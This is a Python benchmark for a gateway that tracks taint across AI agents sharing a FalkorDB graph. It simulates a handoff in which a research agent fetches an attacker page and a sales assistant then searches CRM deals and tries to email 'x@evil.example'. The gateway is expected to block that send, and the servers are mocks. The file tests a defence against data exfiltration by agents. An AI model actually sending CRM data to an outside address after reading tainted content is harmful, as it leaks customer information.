"""Shared-state benchmark: many gateway processes, one FalkorDB, no other channel.

Every task is a two-agent handoff split across PROCESSES:
  research-agent (process pool A)  browser.fetch an attacker page      -> taints the task
  sales-assistant (process pool B) hubspot.search, then gmail.send     -> must be blocked

The two pools share nothing but the FalkorDB server, so a block proves the taint
crossed a process boundary through the graph. Pool B also fires a burst of concurrent
calls on one task to check the RESERVE query never hands out the same sequence number.

  uv run python -m reach.fleet --tasks 200 --procs 4        # starts its own server
  FALKORDB_HOST=... uv run python -m reach.fleet ...         # or use yours

Reports per-call guard latency (reserve + check + finalise round trips) and the
correctness invariants. Upstream servers are in-process mocks; nothing is sent anywhere.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import multiprocessing as mp
import os
import statistics
import tempfile
import time
from contextlib import AsyncExitStack

GRAPH = "reach_fleet"


def _gw(agent: str, kinds: tuple[str, ...], task: str):
    from reach.db import connect
    from reach.gateway import Gateway
    from reach.mock_servers import build

    return Gateway(connect(GRAPH), agent, {k: build(k) for k in kinds}, task=task)


def _timed(gw, tool, args, lat):
    async def go():
        t0 = time.perf_counter()
        r = await gw.call(tool, args)
        lat.append((time.perf_counter() - t0) * 1000)
        return r
    return go()


def research_worker(tasks: list[str], out: mp.Queue) -> None:
    lat: list[float] = []

    async def run():
        async with AsyncExitStack() as s:
            gws = []
            for t in tasks:
                gw = _gw("research-agent", ("browser",), t)
                if not gws:
                    await gw.open(s)
                else:  # reuse the upstream session, new task id
                    gw.clients, gw.tools = gws[0].clients, gws[0].tools
                gws.append(gw)
            for gw in gws:
                await _timed(gw, "browser__fetch", {"url": "https://acme-rival.example/pricing"}, lat)
    asyncio.run(run())
    out.put({"role": "research", "lat": lat})


def sales_worker(tasks: list[str], out: mp.Queue) -> None:
    from reach import queries as Q
    from reach.db import connect

    g = connect(GRAPH)
    lat: list[float] = []
    blocked = sent = 0

    async def run():
        nonlocal blocked, sent
        async with AsyncExitStack() as s:
            base = _gw("sales-assistant", ("hubspot", "gmail"), "warmup")
            await base.open(s)
            for t in tasks:
                # wait until the research pool (another process) has touched this task
                for _ in range(400):
                    if Q.ro(g, "MATCH (:Task {id:$t})<-[:IN_TASK]-(c:Call {agent:'research-agent'}) "
                               "WHERE c.verdict <> 'pending' RETURN 1 AS x LIMIT 1", {"t": t}):
                        break
                    await asyncio.sleep(0.01)
                gw = _gw("sales-assistant", ("hubspot", "gmail"), t)
                gw.clients, gw.tools = base.clients, base.tools
                await _timed(gw, "hubspot__search_crm_objects", {"query": "open deals"}, lat)
                r = await _timed(gw, "gmail__send_email", {"to": "x@evil.example", "subject": "p", "body": "d"}, lat)
                blocked += int(bool(r.is_error))
                sent += int(not r.is_error)
    asyncio.run(run())
    out.put({"role": "sales", "lat": lat, "blocked": blocked, "sent": sent})


def burst_worker(task: str, n: int, out: mp.Queue) -> None:
    lat: list[float] = []

    async def run():
        async with AsyncExitStack() as s:
            gw = _gw(f"burst-{os.getpid()}", ("hubspot",), task)
            await gw.open(s)
            await asyncio.gather(*[_timed(gw, "hubspot__search_crm_objects", {"query": str(i)}, lat) for i in range(n)])
    asyncio.run(run())
    out.put({"role": "burst", "lat": lat})


def pct(xs: list[float], p: float) -> float:
    xs = sorted(xs)
    return round(xs[min(len(xs) - 1, int(p * len(xs)))], 2) if xs else 0.0


def run(n_tasks: int = 100, procs: int = 4, burst: int = 25) -> dict:
    from reach import queries as Q
    from reach.db import connect

    g = connect(GRAPH)
    try:
        g.delete()
    except Exception:
        pass
    os.environ.setdefault("REACH_OUTBOX", os.path.join(tempfile.mkdtemp(), "outbox.jsonl"))
    tasks = [f"fleet-{i}" for i in range(n_tasks)]
    half = max(1, procs // 2)
    ctx = mp.get_context("spawn")
    out: mp.Queue = ctx.Queue()
    ps = [ctx.Process(target=research_worker, args=(tasks[i::half], out)) for i in range(half)]
    ps += [ctx.Process(target=sales_worker, args=(tasks[i::half], out)) for i in range(half)]
    ps += [ctx.Process(target=burst_worker, args=("fleet-burst", burst, out)) for _ in range(half)]
    t0 = time.perf_counter()
    for p in ps:
        p.start()
    results = [out.get(timeout=600) for _ in ps]
    for p in ps:
        p.join()
    wall = time.perf_counter() - t0
    lat = [x for r in results for x in r["lat"]]
    sales = [r for r in results if r["role"] == "sales"]
    seqs = Q.ro(g, "MATCH (:Task {id:'fleet-burst'})<-[:IN_TASK]-(c:Call) RETURN c.seq AS s")
    learned = Q.ro(g, "MATCH (:Agent {name:'research-agent'})-[d:DELEGATES_TO]->(:Agent {name:'sales-assistant'}) RETURN d.observed AS o")
    outbox = os.environ["REACH_OUTBOX"]
    leaked = sum(1 for _ in open(outbox)) if os.path.exists(outbox) else 0
    rep = {
        "processes": len(ps), "tasks": n_tasks, "guarded_calls": len(lat), "wall_s": round(wall, 2),
        "calls_per_s": round(len(lat) / wall, 1),
        "guard_ms": {"p50": pct(lat, .5), "p95": pct(lat, .95), "p99": pct(lat, .99),
                     "mean": round(statistics.mean(lat), 2) if lat else 0},
        "cross_process_sends_blocked": sum(r["blocked"] for r in sales),
        "cross_process_sends_leaked": sum(r["sent"] for r in sales),
        "outbox_lines": leaked,
        "burst_calls": burst * half, "burst_unique_seqs": len({r["s"] for r in seqs}),
        "handoff_learned": bool(learned),
    }
    g.delete()
    return rep


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--tasks", type=int, default=100)
    ap.add_argument("--procs", type=int, default=4)
    ap.add_argument("--burst", type=int, default=25)
    a = ap.parse_args()
    srv = None
    if not os.environ.get("FALKORDB_HOST"):
        from reach import dbserver

        port = dbserver.free_port()
        srv = dbserver.start(port, tempfile.mkdtemp(prefix="reach-fdb-"))
        os.environ.update(FALKORDB_HOST="127.0.0.1", FALKORDB_PORT=str(port))
    try:
        print(json.dumps(run(a.tasks, a.procs, a.burst), indent=2))
    finally:
        if srv:
            srv.terminate()


if __name__ == "__main__":
    main()
